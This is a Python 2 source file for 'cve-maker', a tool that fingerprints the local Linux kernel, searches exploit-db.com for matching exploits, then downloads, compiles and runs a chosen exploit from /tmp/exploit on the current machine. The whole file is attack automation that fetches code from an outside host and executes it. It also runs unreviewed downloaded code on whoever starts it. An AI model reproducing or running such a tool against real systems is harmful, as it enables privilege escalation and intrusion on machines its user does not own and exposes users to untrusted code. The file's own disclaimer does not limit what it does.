#!/usr/bin/python

__description__ = 'Tool to detect, find, compile and execute a CVE on the current machine.'
__author__ = 'msd0pe'
__version__ = '1.2'
__date__ = '2019/06/28'

"""
https://github.com/msd0pe-1
Source code put in public domain by msd0pe, no Copyright
Any malicious or illegal activity may be punishable by law
Use at your own risk
"""

"""
CHANGELOG:
	2019/06/28 : V1.2 - Adding the EDB Check option.
	2019/06/25 : V1.1 - Adding the Detection option.
	2019/06/23 : V1.0 - Project Start.
"""

import os
import re
import urllib
import requests
import optparse
import subprocess
from bs4 import BeautifulSoup

exploit_db = "https://www.exploit-db.com/"

class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    OCRA = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def Execute(name, langage):
    YES = {'Y', 'y', 'YES', 'yes'}
    NO = {'N', 'n', 'NO', 'no', ''}
    
    choice = raw_input(bcolors.RED + bcolors.BOLD + "> RUN THE EXPLOIT ?" + bcolors.ENDC + bcolors.ENDC + " Y/(N)\n\n" )
    if choice in YES:
        print bcolors.BLUE + bcolors.BOLD + "\nRUNNING...\n" + bcolors.ENDC + bcolors.ENDC
	try:
	    if langage == "sh":
	        subprocess.call(["sh", "/tmp/exploit/" + name + ".sh"])
	    elif langage == "ruby":
	        subprocess.call(["ruby", "/tmp/exploit/" + name + ".rb"])
	    elif langage == "perl":
	        subprocess.call(["perl", "/tmp/exploit/" + name + ".pl"])
	    elif langage == "python":
	        subprocess.call(["python", "/tmp/exploit/" + name + ".py"])
	    elif langage == "php":
	        subprocess.call(["php", "/tmp/exploit/" + name + ".php"])
	    else:
                subprocess.call(["/tmp/exploit/" + name])
	except OSError:
	    print bcolors.RED + bcolors.BOLD + "Failed to run the exploit ! Maybe you forgot to specify the right langage.\nBe carefull, sometimes, CVE contains not only the payload. Use 'cat /tmp/exploit/yourexploit.something to verify if it not contains some text.'\n"
    elif choice in NO:
        exit()
    else:
        print bcolors.RED + bcolors.BOLD + "\nYou must enter a valid letter !" + bcolors.ENDC + bcolors.ENDC
        Execute(name, langage)


def Compilation(name, options, langage):

    print bcolors.BLUE + bcolors.BOLD + "COMPILING...\n" + bcolors.ENDC + bcolors.ENDC

    if langage == "sh":
	pass

    elif langage == "ruby":
	pass

    elif langage == "perl":
	pass

    elif langage == "python":
	pass

    elif langage == "php":
	pass

    elif langage == "c++":
        if options == None:
	    command = ["g++", "/tmp/exploit/" + name + ".cpp", "-o", "/tmp/exploit/" + name]
	    try:
		print bcolors.OCRA + bcolors.BOLD + "> COMMAND : " + bcolors.ENDC + bcolors.ENDC + ' '.join(command)
	        msg = subprocess.check_output(command)
	        print bcolors.GREEN + bcolors.BOLD + "> EXPLOIT COMPILED WITH SUCCESS : "  + bcolors.ENDC + bcolors.ENDC +"/tmp/exploit/" + name + "\n"
	    except:
	        print bcolors.RED + bcolors.BOLD + "\n/!\ Error during the compilation ! /!\ " + bcolors.ENDC + bcolors.ENDC
	        print bcolors.RED + bcolors.BOLD + "/!\ This exploit probably needs GCC options ! /!\ \n" + bcolors.ENDC + bcolors.ENDC
		exit()
        else:
	    command = ["g++", "/tmp/exploit/" + name + ".cpp", "-o", "/tmp/exploit/" + name, options]
	    try:
		print bcolors.OCRA + bcolors.BOLD + "> COMMAND : " + bcolors.ENDC + bcolors.ENDC + ' '.join(command)
	        msg = subprocess.check_output(command)
	        print bcolors.GREEN + bcolors.BOLD + "> EXPLOIT COMPILED WITH SUCCESS : "  + bcolors.ENDC + bcolors.ENDC +"/tmp/exploit/" + name + "\n"
	    except:
	        print bcolors.RED + bcolors.BOLD + "\n/!\ Error during the compilation ! /!\ " + bcolors.ENDC + bcolors.ENDC
                print bcolors.RED + bcolors.BOLD + "/!\ GCC options seams to be not correct or library missing /!\ \n" + bcolors.ENDC + bcolors.ENDC
		exit()

    else:
        if options == None:
	    command = ["gcc", "/tmp/exploit/" + name + ".c", "-o", "/tmp/exploit/" + name]
	    try:
		print bcolors.OCRA + bcolors.BOLD + "> COMMAND : " + bcolors.ENDC + bcolors.ENDC + ' '.join(command) 
	        msg = subprocess.check_output(command)
	        print bcolors.GREEN + bcolors.BOLD + "> EXPLOIT COMPILED WITH SUCCESS : "  + bcolors.ENDC + bcolors.ENDC +"/tmp/exploit/" + name + "\n"
	    except:
	        print bcolors.RED + bcolors.BOLD + "\n/!\ Error during the compilation ! /!\ " + bcolors.ENDC + bcolors.ENDC
	        print bcolors.RED + bcolors.BOLD + "/!\ This exploit probably needs GCC options ! /!\ \n" + bcolors.ENDC + bcolors.ENDC
		exit()
        else:
	    command = ["gcc", "/tmp/exploit/" + name + ".c", "-o", "/tmp/exploit/" + name, options]
	    try:
	        print bcolors.OCRA + bcolors.BOLD + "> COMMAND : " + bcolors.ENDC + bcolors.ENDC + ' '.join(command) 
	        msg = subprocess.check_output(command)
	        print bcolors.GREEN + bcolors.BOLD + "> EXPLOIT COMPILED WITH SUCCESS : "  + bcolors.ENDC + bcolors.ENDC +"/tmp/exploit/" + name + "\n"
	    except:
	        print bcolors.RED + bcolors.BOLD + "\n/!\ Error during the compilation ! /!\ " + bcolors.ENDC + bcolors.ENDC
                print bcolors.RED + bcolors.BOLD + "/!\ GCC options seams to not be correct or library missing /!\ \n" + bcolors.ENDC + bcolors.ENDC
		exit()


def WritePayload(payload, name, langage):
    
    if langage == "sh":
        exploit = open("/tmp/exploit/" + str(name) + ".sh", "wb")
        exploit.write(payload)
        exploit.close()
        print bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".sh\n" 

    elif langage == "ruby":
        exploit = open("/tmp/exploit/" + str(name) + ".rb", "wb")
        exploit.write(payload)
        exploit.close()
        print bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".rb\n" 

    elif langage == "perl":
        exploit = open("/tmp/exploit/" + str(name) + ".pl", "wb")
        exploit.write(payload)
        exploit.close()
        print bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".pl\n" 

    elif langage == "python":
        exploit = open("/tmp/exploit/" + str(name) + ".py", "wb")
        exploit.write(payload)
        exploit.close()
        print bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".py\n"

    elif langage == "php":
        exploit = open("/tmp/exploit/" + str(name) + ".php", "wb")
        exploit.write(payload)
        exploit.close()
        print bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".php\n"

    elif langage == "c++":
        exploit = open("/tmp/exploit/" + str(name) + ".cpp", "wb")
        exploit.write(payload)
        exploit.close()
        print bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".cpp\n"

    else:
        exploit = open("/tmp/exploit/" + str(name) + ".c", "wb")
        exploit.write(payload)
        exploit.close()
        print bcolors.GREEN + bcolors.BOLD + "> EXPLOIT CREATED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/exploit/" + str(name) + ".c\n" 


def FindCVE(site, cve, edb):
    
    global name
    global payload
    
    if site == "exploit_db":
    	if edb:
	    print bcolors.OCRA + bcolors.BOLD + "\n> SEARCHING FOR : " + bcolors.ENDC + bcolors.ENDC + exploit_db + "raw/" + edb
            sock = urllib.urlopen(exploit_db + "raw/" + edb)
	    payload = sock.read()
	    sock.close()
	    name = edb
	    error = re.search('Page Not Found', str(payload))
	    if error != None:
		print bcolors.RED + bcolors.BOLD + "\nExploit not found ! Verify your ECB-ID.\n" + bcolors.ENDC + bcolors.ENDC
		exit()

       
        elif cve:
	    print bcolors.OCRA + bcolors.BOLD + "\n> SEARCHING FOR : " + bcolors.ENDC + bcolors.ENDC + exploit_db + "search?cve=" + cve 
	    header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36","X-Requested-With": "XMLHttpRequest"}
	    url = exploit_db + "search?cve=" + cve
	    sock_cve = requests.get(url, headers = header)
	    findme = BeautifulSoup(sock_cve.text, 'html.parser')
            try:
	        cve_edb = re.search('exploit_id\"\:\"(.*?)\"\,\"code_type', str(findme)).group(1)
	        print bcolors.PURPLE + bcolors.BOLD + "> DETERMINATION OF THE EDB ID : " + bcolors.ENDC + bcolors.ENDC + cve_edb
	        sock_edb = urllib.urlopen(exploit_db + "raw/" + cve_edb)
	        payload = sock_edb.read()
	        sock_edb.close()
	        name = cve_edb
	    except AttributeError:
		print bcolors.RED + bcolors.BOLD + "\nCVE name seams to not be correct." + bcolors.ENDC + bcolors.ENDC	   

    return payload, name


def CreateDirectory():
    try: 
        os.makedirs("/tmp/exploit")
    except OSError:
        if not os.path.isdir("/tmp/exploit"):
            Raise


def IsCheck(description, i, check):

    if check == None:
	pass

    else:
	detect_edb_id = re.search('\"(.*?)\"\,', str(description[i])).group(1)
        url = exploit_db + "exploits/" + detect_edb_id
        sock_check = urllib.urlopen(url)
        ischeck = sock_check.read()
        sock_check.close()
        verified = re.search('mdi-check', str(ischeck))
        if verified == None:
	    print bcolors.OCRA + bcolors.BOLD + "EDB Verified : " + bcolors.ENDC + bcolors.ENDC + bcolors.RED + bcolors.BOLD + "NO" + bcolors.ENDC + bcolors.ENDC
        else:
	    print bcolors.OCRA + bcolors.BOLD + "EDB Verified : " + bcolors.ENDC + bcolors.ENDC + bcolors.GREEN + bcolors.BOLD + "YES" + bcolors.ENDC + bcolors.ENDC


def DetectCVE(site, detect, check):
    if site == "exploit_db":
        if detect == None:
	    pass

        else:
	    print bcolors.BLUE + bcolors.BOLD + "\nDETECTING...\n" + bcolors.ENDC + bcolors.ENDC
	    os_uname = os.uname()
	    os_concat = os_uname[0] + ' ' + os_uname[2]
	    os_version_full = re.search('(.*?)-', os_concat).group(1)
	    os_version_number = re.search('Linux (.*?)-', os_concat).group(1)
	    print bcolors.PURPLE + bcolors.BOLD + "> KERNEL FOUND : " + bcolors.ENDC + bcolors.ENDC + os_version_full + "\n"

	    header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36","X-Requested-With": "XMLHttpRequest"}
	    url = exploit_db + "search?q=" + os_version_number
	    print bcolors.OCRA + bcolors.BOLD + "> SEARCHING FOR : " + bcolors.ENDC + bcolors.ENDC + url + "\n"
	    sock_detect = requests.get(url, headers = header)
	    findme = BeautifulSoup(sock_detect.text, 'html.parser')
	    try:
		detect_cve_name = re.findall('\"cve\"\,\"code\"\:\"(.*?)\"', str(findme), re.DOTALL)
		description = re.findall('description\"\:(.*?)\,\"type_id', str(findme), re.DOTALL)
		if detect_cve_name == [] and description == []:
		    print bcolors.GREEN + bcolors.BOLD + "This machine does not seams vulnerable !" + bcolors.ENDC + bcolors.ENDC
		    print ""
		else:
		    print bcolors.RED + bcolors.BOLD + "> POSSIBLE EXPLOITS : " + bcolors.ENDC + bcolors.ENDC + "\n"
		    if detect_cve_name == [] and description != []:
		        for i in range(0, len(description)):
			    print bcolors.RED + bcolors.BOLD + "CVE-NONE" + bcolors.ENDC + bcolors.ENDC + " : " + description[i]
			    IsCheck(description, i, check)
		        print ""
		    elif description == [] and detect_cve_name != []:
		        for i in range(0, len(detect_cve_name)):
			    print bcolors.RED + bcolors.BOLD + "CVE-" + bcolors.ENDC + bcolors.ENDC + detect_cve_name[i] + " : " + "No description found."
			    IsCheck(detect_cve_name, i, check)
		        print ""
		    else:
		        for i in range(0, len(detect_cve_name)):
			    print bcolors.RED + bcolors.BOLD + "CVE-" + bcolors.ENDC + bcolors.ENDC + detect_cve_name[i] + " : " + description[i]
			    IsCheck(description, i, check)
		        print bcolors.RED + bcolors.BOLD + "\nPrefer the use of ECB-ID, CVE-NAME can be fake. I'll fix it in the next release." + bcolors.ENDC + bcolors.ENDC
		        print ""
	    except:
		print bcolors.RED + bcolors.BOLD + "Error during the detection !\n" + bcolors.ENDC + bcolors.ENDC


def Main():
    Menu = optparse.OptionParser(usage='python %prog [options] site', version='%prog ' + __version__)
    Menu.add_option('-d', '--detect', action="store_true", dest="detect", help='detect vulnerabilities on the current machine')
    Menu.add_option('-i', '--check', action="store_true", dest="check", help='check if the edb-id is verified')
    Menu.add_option('-c', '--cve', type="str", help='looks for the CVE from its name')
    Menu.add_option('-e', '--edb', type="str", dest="edb", help='looks for the CVE from its EDB-ID')
    Menu.add_option('-g', '--gcc', type="str", dest="gcc", help='add options to compilation')
    Menu.add_option('-l', '--lang', type="str", dest="lang", help='langage of the exploit [Default: c]')
    (options, args) = Menu.parse_args()

    Sites = optparse.OptionGroup(Menu, "Available 0day sites", "exploit_db\n")
    Menu.add_option_group(Sites)

    Langages = optparse.OptionGroup(Menu, "Langages", "sh\n ruby\n perl\n python\n php\n c++\n c\n")
    Menu.add_option_group(Langages)

    Examples = optparse.OptionGroup(Menu, "Examples", 'python cve-maker -e 12345 -l ruby exploit_db                          python cve-maker -c 2019-98765 -g "-lpthread" exploit_db')
    Menu.add_option_group(Examples) 

    sites = {"exploit_db"}
     
    if len(args) != 1:
        Menu.print_help()
	print('')
	print('  %s' % __description__)
        print('  Source code put in public domain by ' + bcolors.PURPLE + bcolors.BOLD + 'msd0pe' + bcolors.ENDC + bcolors.ENDC + ',' + bcolors.RED + bcolors.BOLD + 'no Copyright' + bcolors.ENDC + bcolors.ENDC)
	print('  Any malicious or illegal activity may be punishable by law')
	print('  Use at your own risk')

    elif len(args) == 1:
	site = args[0]
    	if site in sites:
            try:
		DetectCVE(site, options.detect, options.check)
                CreateDirectory()
                FindCVE(site, options.cve, options.edb)	
	        WritePayload(payload, name, options.lang)
	        Compilation(name, options.gcc, options.lang)
	        Execute(name, options.lang)
            except NameError:
		if options.cve == None and options.edb == None and options.detect == None and options.check == None:
		    print bcolors.RED + bcolors.BOLD + "\nYou must specify a CVE-NAME or a EDB-ID !\n" + bcolors.ENDC + bcolors.ENDC
		elif options.check == True and options.detect == None:
		    print bcolors.RED + bcolors.BOLD + "\nDon't forget the '-d' option !\n" + bcolors.ENDC + bcolors.ENDC
		else:
		    pass

        else:
            Menu.print_help()
	    print('')
	    print('  %s' % __description__)
            print('  Source code put in public domain by ' + bcolors.PURPLE + bcolors.BOLD + 'msd0pe' + bcolors.ENDC + bcolors.ENDC + ',' + bcolors.RED + bcolors.BOLD + 'no Copyright' + bcolors.ENDC + bcolors.ENDC)
	    print('  Any malicious or illegal activity may be punishable by law')
	    print('  Use at your own risk')

if __name__ == '__main__':
    Main()
